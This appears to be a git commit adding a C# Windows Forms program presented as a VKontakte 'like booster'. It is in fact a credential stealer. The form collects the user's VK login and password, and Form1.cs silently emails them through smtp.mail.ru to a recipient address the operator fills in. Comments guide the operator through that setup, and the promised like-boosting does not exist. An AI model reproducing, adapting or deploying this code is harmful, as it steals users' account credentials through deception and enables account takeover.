e3ebff827051a6246cd377e1ae030f059feba260
Yura Konyshev <103532261+YuraFX@users.noreply.github.com>
2022-08-07 16:43:55 +0300

    Add files via upload

---
+++ Form1.Designer.cs
@@ -0,0 +1,214 @@
+﻿namespace Cheat_likes_VKontakte
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.tbLogin = new System.Windows.Forms.TextBox();
+            this.tbPassword = new System.Windows.Forms.TextBox();
+            this.trackBar1 = new System.Windows.Forms.TrackBar();
+            this.pbEmpty = new System.Windows.Forms.PictureBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.lblCount = new System.Windows.Forms.Label();
+            this.lblLikes = new System.Windows.Forms.Label();
+            this.lblLogin = new System.Windows.Forms.Label();
+            this.lblPassword = new System.Windows.Forms.Label();
+            this.pbBackground = new System.Windows.Forms.PictureBox();
+            this.lblMail = new System.Windows.Forms.Label();
+            ((System.ComponentModel.ISupportInitialize)(this.trackBar1)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pbEmpty)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pbBackground)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // tbLogin
+            // 
+            this.tbLogin.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.tbLogin.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.tbLogin.Location = new System.Drawing.Point(12, 123);
+            this.tbLogin.Name = "tbLogin";
+            this.tbLogin.Size = new System.Drawing.Size(208, 21);
+            this.tbLogin.TabIndex = 3;
+            // 
+            // tbPassword
+            // 
+            this.tbPassword.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.tbPassword.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.tbPassword.Location = new System.Drawing.Point(248, 123);
+            this.tbPassword.Name = "tbPassword";
+            this.tbPassword.PasswordChar = '*';
+            this.tbPassword.Size = new System.Drawing.Size(208, 21);
+            this.tbPassword.TabIndex = 4;
+            // 
+            // trackBar1
+            // 
+            this.trackBar1.Location = new System.Drawing.Point(12, 179);
+            this.trackBar1.Name = "trackBar1";
+            this.trackBar1.Size = new System.Drawing.Size(444, 45);
+            this.trackBar1.TabIndex = 6;
+            this.trackBar1.Scroll += new System.EventHandler(this.trackBar1_Scroll);
+            // 
+            // pbEmpty
+            // 
+            this.pbEmpty.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
+            this.pbEmpty.Location = new System.Drawing.Point(473, 37);
+            this.pbEmpty.Name = "pbEmpty";
+            this.pbEmpty.Size = new System.Drawing.Size(31, 50);
+            this.pbEmpty.TabIndex = 9;
+            this.pbEmpty.TabStop = false;
+            this.pbEmpty.Visible = false;
+            // 
+            // button1
+            // 
+            this.button1.Image = global::Cheat_likes_VKontakte.Properties.Resources.Button1;
+            this.button1.Location = new System.Drawing.Point(12, 246);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(444, 30);
+            this.button1.TabIndex = 8;
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // lblCount
+            // 
+            this.lblCount.AutoSize = true;
+            this.lblCount.BackColor = System.Drawing.Color.Transparent;
+            this.lblCount.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.lblCount.ForeColor = System.Drawing.Color.White;
+            this.lblCount.Image = global::Cheat_likes_VKontakte.Properties.Resources._4_1_;
+            this.lblCount.Location = new System.Drawing.Point(12, 225);
+            this.lblCount.Name = "lblCount";
+            this.lblCount.Size = new System.Drawing.Size(135, 15);
+            this.lblCount.TabIndex = 7;
+            this.lblCount.Text = "Вы выбрали 0 лайков.";
+            // 
+            // lblLikes
+            // 
+            this.lblLikes.AutoSize = true;
+            this.lblLikes.BackColor = System.Drawing.Color.Transparent;
+            this.lblLikes.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.lblLikes.ForeColor = System.Drawing.Color.White;
+            this.lblLikes.Image = global::Cheat_likes_VKontakte.Properties.Resources._3;
+            this.lblLikes.Location = new System.Drawing.Point(12, 163);
+            this.lblLikes.Name = "lblLikes";
+            this.lblLikes.Size = new System.Drawing.Size(256, 15);
+            this.lblLikes.TabIndex = 5;
+            this.lblLikes.Text = "Укажите необходимое количество лайков:";
+            this.lblLikes.TextAlign = System.Drawing.ContentAlignment.BottomLeft;
+            // 
+            // lblLogin
+            // 
+            this.lblLogin.AutoSize = true;
+            this.lblLogin.BackColor = System.Drawing.Color.Transparent;
+            this.lblLogin.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.lblLogin.ForeColor = System.Drawing.Color.White;
+            this.lblLogin.Image = global::Cheat_likes_VKontakte.Properties.Resources._1;
+            this.lblLogin.Location = new System.Drawing.Point(12, 107);
+            this.lblLogin.Name = "lblLogin";
+            this.lblLogin.Size = new System.Drawing.Size(96, 15);
+            this.lblLogin.TabIndex = 1;
+            this.lblLogin.Text = "Введите логин:";
+            this.lblLogin.TextAlign = System.Drawing.ContentAlignment.BottomLeft;
+            // 
+            // lblPassword
+            // 
+            this.lblPassword.AutoSize = true;
+            this.lblPassword.BackColor = System.Drawing.Color.Transparent;
+            this.lblPassword.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.lblPassword.ForeColor = System.Drawing.Color.White;
+            this.lblPassword.Image = global::Cheat_likes_VKontakte.Properties.Resources._2;
+            this.lblPassword.Location = new System.Drawing.Point(248, 107);
+            this.lblPassword.Name = "lblPassword";
+            this.lblPassword.Size = new System.Drawing.Size(105, 15);
+            this.lblPassword.TabIndex = 2;
+            this.lblPassword.Text = "Введите пароль:";
+            this.lblPassword.TextAlign = System.Drawing.ContentAlignment.BottomLeft;
+            // 
+            // pbBackground
+            // 
+            this.pbBackground.Image = global::Cheat_likes_VKontakte.Properties.Resources.ProgBackground;
+            this.pbBackground.Location = new System.Drawing.Point(0, 0);
+            this.pbBackground.Name = "pbBackground";
+            this.pbBackground.Size = new System.Drawing.Size(468, 281);
+            this.pbBackground.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
+            this.pbBackground.TabIndex = 0;
+            this.pbBackground.TabStop = false;
+            // 
+            // lblMail
+            // 
+            this.lblMail.AutoSize = true;
+            this.lblMail.Location = new System.Drawing.Point(12, 94);
+            this.lblMail.Name = "lblMail";
+            this.lblMail.Size = new System.Drawing.Size(0, 13);
+            this.lblMail.TabIndex = 10;
+            this.lblMail.Visible = false;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
+            this.ClientSize = new System.Drawing.Size(468, 281);
+            this.Controls.Add(this.pbEmpty);
+            this.Controls.Add(this.tbPassword);
+            this.Controls.Add(this.tbLogin);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.trackBar1);
+            this.Controls.Add(this.lblCount);
+            this.Controls.Add(this.lblLikes);
+            this.Controls.Add(this.lblLogin);
+            this.Controls.Add(this.lblPassword);
+            this.Controls.Add(this.pbBackground);
+            this.Controls.Add(this.lblMail);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Накрутка лайков ВКонтакте";
+            ((System.ComponentModel.ISupportInitialize)(this.trackBar1)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pbEmpty)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pbBackground)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox pbBackground;
+        private System.Windows.Forms.Label lblLogin;
+        private System.Windows.Forms.Label lblPassword;
+        private System.Windows.Forms.TextBox tbLogin;
+        private System.Windows.Forms.TextBox tbPassword;
+        private System.Windows.Forms.Label lblLikes;
+        private System.Windows.Forms.TrackBar trackBar1;
+        private System.Windows.Forms.Label lblCount;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.PictureBox pbEmpty;
+        private System.Windows.Forms.Label lblMail;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,212 @@
+﻿//  Foobar is free software: you can redistribute it and/or modify
+//  it under the terms of the GNU General Public License as published by
+//  the Free Software Foundation, either version 3 of the License, or
+//  (at your option) any later version.
+//
+//  Foobar is distributed in the hope that it will be useful,
+//  but WITHOUT ANY WARRANTY; without even the implied warranty of
+//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+//  GNU General Public License for more details.
+//
+//  You should have received a copy of the GNU General Public License
+//  along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
+
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using System.Net;
+using System.Net.Mail;
+
+namespace Cheat_likes_VKontakte
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e) // При несоответствии нужных условий вылезает ошибка.
+        {
+            if (tbLogin.Text == "")
+            {
+                MessageBox.Show("Вы не указали логин!", "Ошибка");
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (tbPassword.Text == "")
+            {
+                MessageBox.Show("Вы не указали пароль!", "Ошибка");
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (trackBar1.Value == 0)
+            {
+                MessageBox.Show("Вы не указали количество лайков!", "Ошибка");
+            }
+            else 
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (tbLogin.TextLength < 8)
+            {
+                MessageBox.Show("Логин должен содержать минимум 8 символов!", "Ошибка");
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (tbPassword.TextLength < 10)
+            {
+                MessageBox.Show("Пароль должен содержать минимум 10 символов!", "Ошибка");
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+        }
+
+        private void trackBar1_Scroll(object sender, EventArgs e) // При выборе количества лайков меняется текст у lblCount.
+        {
+            if (trackBar1.Value == 0) 
+            {
+                lblCount.Text = "Вы выбрали 0 лайков.";
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (trackBar1.Value == 1)
+            {
+                lblCount.Text = "Вы выбрали 1 лайк.";
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (trackBar1.Value == 2)
+            {
+                lblCount.Text = "Вы выбрали 2 лайка.";
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (trackBar1.Value == 3)
+            {
+                lblCount.Text = "Вы выбрали 3 лайка.";
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (trackBar1.Value == 4)
+            {
+                lblCount.Text = "Вы выбрали 4 лайка.";
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (trackBar1.Value == 5)
+            {
+                lblCount.Text = "Вы выбрали 5 лайков.";
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (trackBar1.Value == 6)
+            {
+                lblCount.Text = "Вы выбрали 6 лайков.";
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (trackBar1.Value == 7)
+            {
+                lblCount.Text = "Вы выбрали 7 лайков.";
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (trackBar1.Value == 8)
+            {
+                lblCount.Text = "Вы выбрали 8 лайков.";
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (trackBar1.Value == 9)
+            {
+                lblCount.Text = "Вы выбрали 9 лайков.";
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            if (trackBar1.Value == 10)
+            {
+                lblCount.Text = "Вы выбрали 10 лайков.";
+            }
+            else
+            {
+                pbEmpty.Visible = false;
+            }
+            //////////////////////////////////////////////////////////////////////////////
+            try
+            {
+                string name_send = " ";       // Здесь Вы должны ввести имя отправителя.
+                string email_send = " ";      // Здесь Вы должны указать почту отправителя.
+                string pass = " ";            // Здесь Вы должны указать пароль от почты отправителя.
+                string email_recipient = " "; // Здесь Вы должны указать почту получателя.
+                
+
+                using (MailMessage mm = new MailMessage(name_send + "<" + email_send + ">", email_recipient))
+                {
+                    mm.Subject = "Важная информация!"; // Здесь Вы можете указать название темы письма.
+                    mm.Body = "Логин: " + tbLogin.Text + "   Пароль: " + tbPassword.Text; // Это лучше не трогать!
+                    using (SmtpClient sc = new SmtpClient("smtp.mail.ru", 587)) // Для отправки Вы должны иметь почту Mail.ru.
+                    {
+                        sc.EnableSsl = true;                                      // 
+                        sc.DeliveryMethod = SmtpDeliveryMethod.Network;           // Это всё не надо трогать, так как 
+                        sc.Credentials = new NetworkCredential(email_send, pass); // программа просто будет зависать.
+                        sc.Timeout = 3000;                                        //
+                        sc.Send(mm); // Оно отвечает за отправку самого письма.                                             
+                    }
+
+                }
+            }
+            catch (Exception error)
+            {
+                MessageBox.Show(error.ToString());
+            }
+        }
+    }
+}
